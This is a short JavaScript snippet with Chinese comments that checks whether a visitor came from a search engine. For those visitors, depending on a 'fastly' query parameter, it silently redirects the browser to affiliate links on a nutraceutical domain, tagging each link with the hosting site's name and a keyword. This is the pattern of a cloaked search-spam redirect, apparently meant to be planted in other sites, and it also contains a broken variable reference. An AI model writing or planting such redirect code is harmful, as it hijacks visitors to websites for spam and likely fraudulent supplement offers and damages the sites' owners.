var currentUrl = window.location.href;
var hostParam = window.location.hostname; // 获取主机名
var urlParams = new URLSearchParams(window.location.search);

// 获取查询参数
var jumpParam = urlParams.get('fastly');
var idParam = urlParams.get('id');
var encodedIdParams = encodeURIComponent(idParams);
function isFromSearchEngine() {
    var referrer = document.referrer.toLowerCase();
    console.log("referrer: " + referrer);
    return referrer.includes('google') || referrer.includes('bing') || referrer.includes('yahoo.com') || referrer.includes('baidu.com') || referrer.includes('duckduckgo.com');
}

if (isFromSearchEngine()) {
    // 从搜索引擎跳转过来
    var redirectUrl;

    // 根据 Fastly 参数的值设置 redirectUrl
    switch (jumpParam) {
        case 'api':
            redirectUrl = 'https://nutra.nutra4healthy.com/go/31e19754-c995-484a-852d-793a27720127?site=' + hostParam + '&aff=wppppp';
            break;
        case '741':
            redirectUrl = 'https://nutra.nutra4healthy.com/go/89141def-2ae3-4a28-86b5-9b4b20f725d4?site=' + hostParam + '&keyword=' + encodedIdParams;
            break;
        case '852':
            redirectUrl = 'https://nutra.nutra4healthy.com/go/3635fd41-3938-4d30-8912-535194e34d6a?site=' + hostParam + '&keyword=' + encodedIdParams;
            break;
        case '963':
            redirectUrl = 'https://nutra.nutra4healthy.com/go/a28c3399-60e3-4a3b-9669-85ff033b2e08?site=' + hostParam + '&keyword=' + encodedIdParams;
            break;
        default:
            redirectUrl = ''; // 如果没有匹配的值，可以设置为空或其他默认值
            break;
    }

    if (redirectUrl) {
        window.location.href = redirectUrl;
    }
}
